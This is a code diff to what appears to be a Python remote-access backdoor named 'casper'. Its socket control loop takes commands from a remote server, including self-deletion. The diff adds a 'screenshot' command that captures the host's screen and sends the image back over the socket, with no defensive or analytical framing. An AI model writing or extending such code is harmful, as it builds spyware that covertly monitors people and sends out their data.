@@ -70,10 +70,20 @@ def socket_control():
 							else:
 								socket_server.send(encode("\nError during deletion of myself\n"))
 						elif (data.split()[0] == "screenshot"):
-							#
-							# ToDo: Rewrite screenshot function since we have no error handling at the moment
-							#
-							socket_server.send(encode(screenshot()))
+								try:
+									with mss.mss() as screen:
+										logging.debug('[casper] Getting monitors')
+										image = screen.grab(screen.monitors[1-1])
+										
+										logging.debug('[casper] Reading image raw_bytes')
+										raw_bytes = mss.tools.to_png(image.rgb,image.size)
+										
+										logging.debug('[casper] Successfully read image raw_bytes')
+										socket_server.send(encode(raw_bytes))
+										socket_server.send(encode("\nSuccessfully received screenshot\n"))	
+								except Exception as e:
+									logging.debug('[casper] Error saving screenshot')
+									return False
 						else:
 							pass
 				except Exception as e:
